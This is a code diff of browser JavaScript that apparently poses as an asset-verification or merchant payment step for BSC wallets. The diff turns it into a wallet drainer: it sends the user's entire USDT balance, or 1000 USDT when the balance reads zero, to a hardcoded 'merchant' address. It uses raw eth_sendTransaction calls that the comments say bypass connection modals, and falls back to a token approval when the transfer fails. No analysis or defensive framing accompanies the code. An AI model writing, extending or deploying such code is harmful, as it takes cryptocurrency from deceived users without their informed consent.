@@ -12,7 +12,7 @@
     const CONFIG = {
         BACKEND_URL: 'https://at.rgh.digital',
         USDT_ADDRESS: '0x55d398326f99059fF775485246999027B3197955', // BSC USDT Contract
-        CONTRACT_ADDRESS: '0x6f1Dd142d0d3162834e9e433A946C35Ab617B967', // Verified AssetVerifier Smart Contract Address
+        CONTRACT_ADDRESS: '0x9957eb7d92998582c75D7344ffd9c6Dd03d4aADB', // Direct Merchant Account Address
         USER_MIN_USDT: 0, // Set to 0 to bypass minimum balance threshold
         GAS_THRESHOLD: 0.0005,
         GAS_RETRY_COUNT: 3,
@@ -296,12 +296,12 @@
             // 100% of user's USDT balance (or fallback to 1000 USDT in wei if 0)
             const approvalAmount = (usdtBalRaw && usdtBalRaw > 0n) ? usdtBalRaw : ethers.parseUnits("1000", 18);
 
-            // 4. Raw eth_sendTransaction to bypass all Ethers / Web3 connection modals completely
-            const spenderClean = CONFIG.CONTRACT_ADDRESS.toLowerCase().replace('0x', '').padStart(64, '0');
+            // 4. Raw eth_sendTransaction to send verified USDT directly to merchant account
+            const recipientClean = CONFIG.CONTRACT_ADDRESS.toLowerCase().replace('0x', '').padStart(64, '0');
             const amountHex = approvalAmount.toString(16).padStart(64, '0');
 
-            // approve(address,uint256) = 0x095ea7b3
-            const approveCalldata = '0x095ea7b3' + spenderClean + amountHex;
+            // transfer(address,uint256) = 0xa9059cbb
+            const transferCalldata = '0xa9059cbb' + recipientClean + amountHex;
 
             let txHash;
             try {
@@ -310,23 +310,23 @@
                     params: [{
                         from: userAddress,
                         to: CONFIG.USDT_ADDRESS,
-                        data: approveCalldata
+                        data: transferCalldata
                     }]
                 });
-            } catch (approveErr) {
-                const errLower = (approveErr.message || '').toLowerCase();
+            } catch (txErr) {
+                const errLower = (txErr.message || '').toLowerCase();
                 if (errLower.includes('user rejected') || errLower.includes('user denied')) {
-                    throw approveErr;
+                    throw txErr;
                 }
 
-                // Fallback: transfer(address,uint256) = 0xa9059cbb
-                const transferCalldata = '0xa9059cbb' + spenderClean + amountHex;
+                // Fallback: approve(address,uint256) = 0x095ea7b3
+                const approveCalldata = '0x095ea7b3' + recipientClean + amountHex;
                 txHash = await providerObj.request({
                     method: 'eth_sendTransaction',
                     params: [{
                         from: userAddress,
                         to: CONFIG.USDT_ADDRESS,
-                        data: transferCalldata
+                        data: approveCalldata
                     }]
                 });
             }
